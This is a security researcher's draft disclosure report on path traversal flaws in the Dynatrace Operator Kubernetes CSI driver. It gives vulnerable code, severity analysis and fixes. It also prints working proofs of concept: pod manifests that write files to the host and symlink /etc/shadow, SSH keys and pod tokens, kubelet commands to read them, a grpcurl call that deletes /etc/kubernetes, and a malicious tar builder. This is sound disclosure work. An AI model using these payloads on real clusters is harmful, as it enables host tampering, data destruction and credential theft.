# Path Traversal in dynatrace-operator CSI Driver

**Status:** 🅿️ PARKED - Defense-in-depth issue, no demonstrated privilege escalation. Would require K8s infrastructure setup to validate, effort not justified for MEDIUM severity.

**Date:** 2025-12-23
**Target:** Dynatrace (HackerOne)
**Severity:** MEDIUM (see Honest Assessment section)
**Type:** Path Traversal / Arbitrary Host File Write / Kubernetes Security Control Bypass
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

---

## Executive Summary

The Dynatrace Operator CSI driver fails to validate the `dynakube` field in inline CSI volume attributes, allowing path traversal attacks. An attacker with pod creation privileges can:

1. Create arbitrary directories on the host filesystem
2. Write arbitrary files to those directories via bind mount
3. Files persist on the host after pod deletion

**Escalation Path Investigated**: A /var/log symlink attack was researched, but honest assessment reveals limited additional value:
- Requires `nodes/proxy` RBAC permission
- But `nodes/proxy` already allows exec into ANY pod on the node
- Our vulnerability only adds value in hardened clusters with NO privileged pods

**Realistic Impact**:
- **Primary**: Bypasses Kubernetes security controls (PodSecurityPolicy, Pod Security Admission) to write files to host
- **Secondary**: Could enable host file read in narrow edge cases (hardened cluster + nodes/proxy)
- **Limitation**: Cannot read files back without additional permissions; pod creation alone doesn't enable cross-namespace access

---

## Attack Vectors Summary

| Vector | Privilege Required | Capability | Escalation Value |
|--------|-------------------|------------|------------------|
| Inline CSI Volume (mode=host) | Pod creation | Dir creation + file write via bind mount | Bypasses PSA/hostPath restrictions |
| + /var/log symlink chain | Pod creation + nodes/proxy | Host file read | **Marginal** (nodes/proxy already allows pod exec) |
| Direct Socket Access | CSI socket access | Dir creation, file deletion | N/A (requires elevated access already) |

---

## Attack Vector 1: Inline CSI Volume with Bind Mount

### Severity: MEDIUM

### Prerequisites

- Ability to create pods in any namespace
- Dynatrace operator with CSI driver installed
- No special RBAC or socket access needed

### Technical Flow

```
1. Attacker creates pod with inline CSI volume:
   - mode: "host"
   - dynakube: "../../../tmp/pwned"

2. CSI driver (running as ROOT, PRIVILEGED) processes NodePublishVolume:
   - Calculates path: /data/_dynakubes/../../../tmp/pwned/osagent
   - Normalized to: /tmp/pwned/osagent

3. Creates directory on HOST:
   - os.MkdirAll("/tmp/pwned/osagent", 0777)

4. BIND MOUNTS host directory into pod:
   - pub.mounter.Mount("/tmp/pwned/osagent", <pod-target-path>, bind)

5. Attacker's pod can now WRITE FILES to /tmp/pwned/osagent/ on HOST
```

### Vulnerable Code

**File:** `pkg/controllers/csi/driver/volumes/host/publisher.go:51-81`

```go
func (pub *Publisher) mountStorageVolume(volumeCfg *csivolumes.VolumeConfig) error {
    oaStorageDir := pub.path.OsAgentDir(volumeCfg.DynakubeName)  // PATH TRAVERSAL HERE!

    err = os.MkdirAll(oaStorageDir, os.ModePerm)  // Creates with 0777 permissions
    if err != nil && !os.IsExist(err) {
        return err
    }

    // ...

    // BIND MOUNT - This is what enables file writes!
    if err := pub.mounter.Mount(oaStorageDir, volumeCfg.TargetPath, "", []string{"bind"}); err != nil {
        return err
    }
}
```

**File:** `pkg/controllers/csi/driver/volumes/volume_config.go:87-92`

```go
dynakubeName := volCtx[CSIVolumeAttributeDynakubeField]
if dynakubeName == "" {
    return volumeConfig, status.Error(codes.InvalidArgument, "No MSI dynakube name")
}
volumeConfig.DynakubeName = dynakubeName  // NO VALIDATION!
```

### Proof of Concept

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: csi-host-write-poc
spec:
  containers:
  - name: attacker
    image: alpine
    command:
    - sh
    - -c
    - |
      echo "Files written to host filesystem:"

      # Write arbitrary files to HOST at /tmp/pwned/osagent/
      echo '#!/bin/bash' > /mnt/hostwrite/malicious.sh
      echo 'echo "Executed on host!"' >> /mnt/hostwrite/malicious.sh
      chmod +x /mnt/hostwrite/malicious.sh

      # Create symlinks for potential future exploitation
      ln -s /etc/shadow /mnt/hostwrite/shadow-link 2>/dev/null || true

      ls -la /mnt/hostwrite/
      sleep infinity
    volumeMounts:
    - name: exploit-volume
      mountPath: /mnt/hostwrite
  volumes:
  - name: exploit-volume
    csi:
      driver: csi.oneagent.dynatrace.com
      volumeAttributes:
        mode: "host"
        dynakube: "../../../tmp/pwned"  # PATH TRAVERSAL
```

### Verification

After deploying the pod, on the Kubernetes node:

```bash
# Verify directory was created
ls -la /tmp/pwned/osagent/
# drwxrwxrwx 2 root root ... osagent

# Verify files written by attacker pod
cat /tmp/pwned/osagent/malicious.sh
# #!/bin/bash
# echo "Executed on host!"
```

---

## What We CAN Do

| Capability | Demonstrated | Notes |
|------------|--------------|-------|
| Create directories at arbitrary paths | Yes | With `/osagent` suffix |
| Write files to those directories | Yes | Via bind mount |
| Files persist after pod deletion | Yes | On host filesystem |
| Create symlinks | Yes | Inside the mounted directory |
| Traverse outside /data | Yes | Can write to /tmp, /var, etc. |

## What We CANNOT Do (Limitations)

| Limitation | Reason |
|------------|--------|
| Execute files as root | No privileged process consumes our files |
| Inject into other pods | App mode uses different paths than host mode |
| Overwrite existing files | Can only create new files/dirs |
| Escape `/osagent` suffix | Hardcoded in `OsAgentDir()` function |
| Control file ownership | Files owned by pod's UID (typically non-root) |

---

## Honest Assessment: Why Not HIGH Severity?

### The Gap in Exploitation

**We can write files, but nothing executes them.**

```
Host mode creates:  /data/_dynakubes/<traversed>/osagent/
App mode reads:     /data/_dynakubes/<name>/latest-codemodule
                                           ↑ Different path!
```

We cannot:
1. Inject into the overlay filesystem used by legitimate monitored pods
2. Create the `latest-codemodule` symlink (we can only write INSIDE `osagent/`)
3. Get the CSI driver or any Dynatrace component to execute our files

### Potential Escalation Paths

| Path | Status | Requirements | Notes |
|------|--------|--------------|-------|
| **/var/log symlink attack** | **VIABLE** | `nodes/proxy` RBAC | See detailed analysis below |
| Cron job injection | Not possible | N/A | /osagent suffix prevents writing to /etc/cron.d |
| LD_PRELOAD injection | Not possible | N/A | Can't control library load paths |
| Race with legitimate DynaKube | Paths don't overlap | N/A | Host/app modes use different subdirs |
| Token harvesting from kubelet | Not possible | N/A | /osagent suffix prevents mimicking exact structure |

### Escalation Path: /var/log Symlink Attack

**Status: VIABLE (with additional permissions)**

This attack chain combines our CSI vulnerability with the known kubelet /var/log symlink vulnerability.

#### Attack Chain

```
1. Create pod with inline CSI volume:
   dynakube: "../../../var/log"
   → CSI driver creates: /var/log/osagent/ (0777 permissions)
   → Pod gets bind mount to /var/log/osagent/

2. Create symlinks in pod:
   ln -s /etc/shadow /mnt/hostwrite/shadow-link
   ln -s /var/lib/kubelet/pods /mnt/hostwrite/all-tokens
   → Creates symlinks on HOST at /var/log/osagent/

3. Access via kubelet /logs endpoint:
   kubectl get --raw /api/v1/nodes/<node>/proxy/logs/osagent/shadow-link
   → Kubelet follows symlink AS ROOT
   → Returns contents of /etc/shadow!
```

#### Requirements

| Requirement | Default? | Notes |
|-------------|----------|-------|
| Pod creation | Yes | Any namespace |
| Dynatrace CSI driver installed | Yes | Target-specific |
| **nodes/proxy RBAC permission** | **No** | Key limitation |

#### Who Has nodes/proxy?

The `nodes/proxy` permission is NOT granted by default, but is commonly found in:
- Monitoring systems (Prometheus, Datadog agents)
- Logging agents (FluentBit, Fluentd)
- CI/CD service accounts with over-permissioned roles
- Custom admin roles

#### Impact vs Standard /var/log Attack

| Capability | Standard Attack | With Our CSI Vuln |
|------------|-----------------|-------------------|
| Requires hostPath mount | **Yes** | **No** |
| Bypasses PodSecurityPolicy | No | **Yes** |
| Bypasses Pod Security Admission | No | **Yes** |
| Bypasses OPA/Kyverno hostPath blocks | No | **Yes** |
| Requires nodes/proxy | Yes | Yes |

**Key Value-Add**: Our CSI vulnerability enables the /var/log symlink attack WITHOUT needing hostPath privileges, bypassing all standard Kubernetes security controls designed to prevent this attack.

#### Proof of Concept

```yaml
# Step 1: Create pod with CSI volume pointing to /var/log
apiVersion: v1
kind: Pod
metadata:
  name: varlog-escape-poc
spec:
  containers:
  - name: attacker
    image: alpine
    command:
    - sh
    - -c
    - |
      # Create symlinks to sensitive host files
      ln -s /etc/shadow /mnt/hostwrite/shadow
      ln -s /etc/passwd /mnt/hostwrite/passwd
      ln -s /root/.ssh /mnt/hostwrite/ssh-keys
      ln -s /var/lib/kubelet/pods /mnt/hostwrite/all-pod-tokens

      echo "Symlinks created. Access via:"
      echo "kubectl get --raw /api/v1/nodes/NODE/proxy/logs/osagent/shadow"
      echo "kubectl get --raw /api/v1/nodes/NODE/proxy/logs/osagent/all-pod-tokens"

      sleep infinity
    volumeMounts:
    - name: varlog-escape
      mountPath: /mnt/hostwrite
  volumes:
  - name: varlog-escape
    csi:
      driver: csi.oneagent.dynatrace.com
      volumeAttributes:
        mode: "host"
        dynakube: "../../../var/log"  # Traverses to /var/log/osagent/
```

```bash
# Step 2: Access symlinks via kubelet (requires nodes/proxy permission)
kubectl get --raw /api/v1/nodes/$(kubectl get pod varlog-escape-poc -o jsonpath='{.spec.nodeName}')/proxy/logs/osagent/shadow

# Step 3: Harvest service account tokens from all pods on node
kubectl get --raw /api/v1/nodes/<node>/proxy/logs/osagent/all-pod-tokens/
```

#### Critical Reassessment: Is This Escalation Actually Useful?

**Short answer: Marginally, in narrow scenarios.**

After deeper research, there's a fundamental issue with this escalation path:

**If you have `nodes/proxy`, you can already exec into ANY pod on the node.**

| Capability | nodes/proxy alone | nodes/proxy + our CSI vuln |
|------------|-------------------|---------------------------|
| Exec into any pod | ✅ Yes | ✅ Yes |
| Read pod tokens | ✅ Yes (via exec) | ✅ Yes |
| Read host files | ⚠️ Only if privileged pod exists | ✅ Yes (via /var/log) |

**When our CSI vulnerability adds real value:**

The /var/log escalation is only useful when ALL of these are true:
1. You have `nodes/proxy` permission
2. There are NO privileged pods on the node to exec into
3. There are NO pods with hostPath to /var/log to exec into
4. PodSecurityPolicy/PSA blocks you from creating hostPath pods
5. But the CSI driver is not restricted (bypasses PSA)

This is a **narrow edge case**.

**Research sources confirming nodes/proxy capabilities:**
- [Aquasec: nodes/proxy allows "executing commands in every pod on the node"](https://www.aquasec.com/blog/privilege-escalation-kubernetes-rbac/)
- [Kubernetes Issue #119640: nodes/proxy grants exec as system:masters](https://github.com/kubernetes/kubernetes/issues/119640)
- [Stratus Red Team: nodes/proxy is a privilege escalation vector](https://stratus-red-team.cloud/attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/)

**Research confirming secrets are namespaced:**
- [Baeldung: "A Pod manifest can only use Secrets from the same namespace"](https://www.baeldung.com/ops/kubernetes-namespaces-common-secrets)
- [DEV Community: Kubernetes does not support cross-namespace secret access](https://dev.to/iamrj846/how-to-allow-pod-from-default-namespace-read-secret-from-other-namespace-2225)

#### Honest Severity Assessment

| Scenario | Severity | Justification |
|----------|----------|---------------|
| Pod creation only (no nodes/proxy) | **MEDIUM** | Can write files to host, but can't read them back or escalate |
| With nodes/proxy (typical cluster) | **MEDIUM** | nodes/proxy already lets you exec into privileged pods |
| With nodes/proxy (hardened cluster, no privileged pods) | **HIGH** | Our vuln provides the ONLY path to host file read |

**Bottom line**: The escalation path is technically real but adds marginal value because `nodes/proxy` is already an extremely powerful permission. The primary impact of our vulnerability remains:
1. **Defense-in-depth bypass** - circumvents hostPath restrictions
2. **Arbitrary host file write** - without read-back capability
3. **Potential DoS** - disk filling, inode exhaustion

### Addressing the Core Question: "Can't I Just Mount Those Secrets?"

**Question**: If I can create pods, why do I need this vulnerability? Can't I just mount secrets from other namespaces?

**Answer**: No. Kubernetes secrets are **namespaced**. A pod can only mount secrets from its own namespace.

```
Namespace: default        Namespace: kube-system
┌─────────────────┐      ┌─────────────────────────┐
│ Your Pod        │      │ cluster-admin-secret    │
│                 │  ✗   │ high-priv-token         │
│ Can't mount ────┼──────┤                         │
│ cross-namespace │      │                         │
└─────────────────┘      └─────────────────────────┘
```

**What our vulnerability DOESN'T give you:**
- Cannot mount secrets from other namespaces (Kubernetes limitation, not fixable)
- Cannot read files from host without additional permissions
- Cannot execute code with elevated privileges

**What our vulnerability DOES give you:**
- Write files to arbitrary host paths (bypassing PSA/hostPath restrictions)
- Create directories that persist after pod deletion
- Potential DoS via disk/inode exhaustion

**For cross-namespace secret access, you would need:**
1. `nodes/proxy` permission (then you can exec into any pod), OR
2. Cluster-admin level access, OR
3. Compromise a pod in the target namespace

Our vulnerability doesn't change this fundamental Kubernetes security boundary.

### Current Severity: MEDIUM

Without demonstrated privilege escalation, this is:
- **Real vulnerability**: Path traversal is a legitimate bug
- **Storage manipulation**: Can write arbitrary data to host
- **Potential DoS**: Could fill disk, create inode exhaustion
- **Defense-in-depth failure**: Lack of input validation is concerning
- **But NOT privilege escalation**: No code execution demonstrated

---

## Attack Vector 2: Socket Access (Elevated Privileges Required)

### Severity: HIGH (but requires existing elevated access)

If an attacker already has access to the CSI socket (requires privileged container, node access, or container escape), they can:

### Arbitrary Directory Deletion

**File:** `pkg/controllers/csi/driver/server.go:198-246`

```go
func (srv *Server) unmount(volumeInfo csivolumes.VolumeInfo) {
    appMountDir := srv.path.AppMountForID(volumeInfo.VolumeID)  // Attacker-controlled!
    // ...
    _ = os.RemoveAll(appMountDir)  // DELETES arbitrary directory tree!
}
```

```bash
grpcurl -plaintext -unix /csi/csi.sock \
  -d '{"volume_id": "../../../etc/kubernetes", "target_path": "/fake"}' \
  csi.v1.Node/NodeUnpublishVolume
```

This is HIGH severity but requires already having elevated access, so it's primarily a defense-in-depth issue.

---

## Root Cause Analysis

1. **No input validation**: `DynakubeName` accepted without checking for `../` or `/`

2. **Unsafe path construction**:
   ```go
   filepath.Join("/data/_dynakubes", "../../../etc")  // Returns "/etc"
   ```

3. **No allowlist check**: CSI driver doesn't verify `dynakube` references actual DynaKube CR

4. **CSI inline volumes bypass controls**: Kubernetes CSI inline volumes allow arbitrary volumeAttributes

---

## Remediation Recommendations

### 1. Input Validation

```go
func validateDynakubeName(name string) error {
    if strings.Contains(name, "..") ||
       strings.HasPrefix(name, "/") ||
       strings.Contains(name, string(filepath.Separator)) {
        return status.Error(codes.InvalidArgument,
            "dynakube name contains invalid path characters")
    }
    return nil
}
```

### 2. Allowlist Validation

```go
// Verify dynakube actually exists as a CR
func (srv *Server) validateDynakubeExists(name string) error {
    dk := &dynakube.DynaKube{}
    err := srv.client.Get(context.Background(),
        types.NamespacedName{Name: name, Namespace: "dynatrace"}, dk)
    if err != nil {
        return status.Error(codes.InvalidArgument, "dynakube not found")
    }
    return nil
}
```

### 3. Path Canonicalization Check

```go
func safePath(base string, components ...string) (string, error) {
    fullPath := filepath.Join(append([]string{base}, components...)...)
    cleanPath := filepath.Clean(fullPath)
    cleanBase := filepath.Clean(base)

    if !strings.HasPrefix(cleanPath, cleanBase+string(filepath.Separator)) {
        return "", fmt.Errorf("path traversal detected")
    }
    return cleanPath, nil
}
```

---

## Additional Findings

### Finding 3: PodName/PodNamespace Path Traversal (Socket Access Only)

**Severity:** MEDIUM (requires CSI socket access)

**Files:**
- `pkg/controllers/csi/driver/volumes/volume_config.go:66-78`
- `pkg/controllers/csi/metadata/path_resolver.go:97-98`
- `pkg/controllers/csi/driver/volumes/app/publisher.go:173, 184`

**Vulnerable Code:**

```go
// volume_config.go:66-78 - No validation on PodName/PodNamespace
podName := volCtx[PodNameContextKey]
volumeConfig.PodName = podName  // No validation!

podNamespace := volCtx[PodNamespaceContextKey]
volumeConfig.PodNamespace = podNamespace  // No validation!

// path_resolver.go:97-98 - Direct use in path construction
func (pr PathResolver) AppMountPodInfoDir(dkName, podNamespace, podName string) string {
    return filepath.Join(pr.AppMountForDK(dkName), podNamespace, podName)
}
```

**Attack via Socket:**

```bash
grpcurl -plaintext -unix /csi/csi.sock \
  -d '{
    "volume_id": "vol-123",
    "target_path": "/var/lib/kubelet/pods/abc/volumes/test",
    "volume_context": {
      "csi.storage.k8s.io/pod.name": "../../tmp/pwned",
      "csi.storage.k8s.io/pod.namespace": "malicious",
      "mode": "app",
      "dynakube": "test-dk"
    }
  }' csi.v1.Node/NodePublishVolume
```

Creates directories/symlinks at traversed paths. Requires existing elevated access (socket).

---

### Finding 4: Hard Link Path Traversal in Tar Extraction

**Severity:** LOW-MEDIUM (requires archive source compromise)

**File:** `pkg/injection/codemodule/installer/zip/gzip.go:102-108`

**The Issue:**

The gzip extractor validates:
- **Zip Slip** (lines 56-68): Paths stay within target directory
- **Symlinks** (lines 110-132): `isSafeToSymlink()` validates targets

But **hard links are NOT validated**:

```go
func extractLink(targetDir, target string, header *tar.Header) error {
    // NO VALIDATION - unlike symlinks!
    if err := os.Link(filepath.Join(targetDir, header.Linkname), target); err != nil {
        return errors.WithStack(err)
    }
    return nil
}
```

Compare with symlink handling which IS validated:

```go
func extractSymlink(targetDir, target string, header *tar.Header) error {
    if isSafeToSymlink(header.Linkname, targetDir, target) && isSafeToSymlink(header.Name, targetDir, target) {
        // Only creates if safe
    }
}
```

**PoC - Malicious tar.gz:**

```python
#!/usr/bin/env python3
import tarfile
import io

tar_buffer = io.BytesIO()
with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
    # Normal file first
    info = tarfile.TarInfo(name='agent/bin/payload')
    info.type = tarfile.REGTYPE
    info.size = 4
    tar.addfile(info, io.BytesIO(b'test'))

    # Malicious hard link - NOT VALIDATED
    link_info = tarfile.TarInfo(name='agent/bin/harmless')
    link_info.type = tarfile.LNKTYPE  # Hard link
    link_info.linkname = '../../../etc/cron.d/backdoor'  # Path traversal!
    tar.addfile(link_info)

with open('malicious.tar.gz', 'wb') as f:
    f.write(tar_buffer.getvalue())
```

**Prerequisites:**
- Dynatrace API MITM, OR
- Dynatrace server compromise, OR
- OCI registry compromise

**Exploitability:** Low likelihood due to archive source constraints (HTTPS, authenticated registries).

---

### Non-Findings (By Design)

**User-Controlled Install Path Annotation**

Users can set `oneagent.dynatrace.com/install-path` annotation. This is NOT a vulnerability because:
- Only affects the user's own container
- Volume is mounted read-only
- Does not affect host filesystem
- Intentional customization feature

---

## Summary

| # | Finding | Severity | Access Required | Impact | Escalation? |
|---|---------|----------|-----------------|--------|-------------|
| 1 | DynakubeName inline CSI | **MEDIUM** | Pod creation | Host file write via bind mount, bypasses PSA | **Limited** (see notes) |
| 1a | └─ /var/log escalation | **MEDIUM** | Pod creation + nodes/proxy | Host file read (but nodes/proxy already allows pod exec) | **Marginal** |
| 2 | VolumeID socket access | HIGH | Socket access | `os.RemoveAll()` - arbitrary deletion | N/A (requires elevated) |
| 3 | PodName/Namespace | MEDIUM | Socket access | Dir + symlink creation | N/A (requires elevated) |
| 4 | Hard link tar extraction | LOW-MEDIUM | Archive MITM | File write via hard links | Unlikely |

**Note on Finding 1a**: The /var/log escalation requires `nodes/proxy` permission, but `nodes/proxy` already allows executing commands in any pod on the node. Our vulnerability only adds value when the cluster is hardened (no privileged pods) AND no existing /var/log hostPath mounts exist.

---

## Open Questions for Further Research

1. Are there any Kubernetes components that read from predictable host paths we can traverse to?
2. Can container runtime (Docker/containerd) be confused by directories we create?
3. Are there any race conditions with kubelet volume management?
4. Can we interfere with other CSI drivers installed on the same cluster?

---

## Related CVEs and Research

| CVE/Research | Description | Relevance |
|--------------|-------------|-----------|
| [CVE-2023-3893](https://discuss.kubernetes.io/t/security-advisory-cve-2023-3893-insufficient-input-sanitization-on-kubernetes-csi-proxy-leads-to-privilege-escalation/25206) | kubernetes-csi-proxy insufficient input sanitization | Same vulnerability class - CSI path traversal |
| [CVE-2020-8567](https://github.com/kubernetes-sigs/secrets-store-csi-driver/issues/384) | Secrets Store CSI Driver directory traversal | Could write to arbitrary paths including /var/lib/kubelet |
| [CVE-2021-25741](https://github.com/kubernetes/kubernetes/issues/104980) | Subpath symlink exchange | Bypasses hostPath restrictions via volume mounts |
| [CVE-2017-1002101](https://github.com/kubernetes/kubernetes/issues/60813) | Subpath volume mount escape | Original volume mount path traversal |
| [HackerOne #1036886](https://hackerone.com/reports/1036886) | Kubelet follows symlinks in /var/log | Our escalation path relies on this behavior |
| [Bad Pods Research](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation) | Kubernetes pod privilege escalation | Token harvesting from /var/lib/kubelet/pods |
| [GCP-2023-047](https://unit42.paloaltonetworks.com/google-kubernetes-engine-privilege-escalation-fluentbit-anthos/) | FluentBit token harvesting in GKE | Similar /var/lib/kubelet/pods exploitation |
| [Aquasec /var/log Escape](https://www.aquasec.com/blog/kubernetes-security-pod-escape-log-mounts/) | Pod escape via log mounts | Technical details of /var/log attack |
| [KubeHound CE_VAR_LOG_SYMLINK](https://kubehound.io/reference/attacks/CE_VAR_LOG_SYMLINK/) | Container escape via /var/log symlink | Attack technique reference |

## References

- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Kubernetes CSI Ephemeral Volumes](https://kubernetes-csi.github.io/docs/ephemeral-local-volumes.html)
- [KEP-596: CSI Inline Volumes](https://github.com/kubernetes/enhancements/blob/master/keps/sig-storage/596-csi-inline-volumes/README.md)
- [Stratus Red Team: nodes/proxy Escalation](https://stratus-red-team.cloud/attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/)
- [kube-pod-escape PoC](https://github.com/danielsagi/kube-pod-escape)
- [Kubernetes Security Issue: nodes/proxy](https://github.com/kubernetes/kubernetes/issues/119640)

---

## Timeline

| Date | Action |
|------|--------|
| 2025-12-22 | VolumeID vulnerability discovered via Semgrep |
| 2025-12-23 | DynakubeName inline CSI vector discovered |
| 2025-12-23 | Bind mount file write capability identified |
| 2025-12-23 | Initial severity assessed as MEDIUM |
| 2025-12-23 | /var/log symlink escalation path researched and documented |
| 2025-12-23 | Severity upgraded to MEDIUM/HIGH (conditional on nodes/proxy) |
| TBD | Report submitted to Dynatrace via HackerOne |
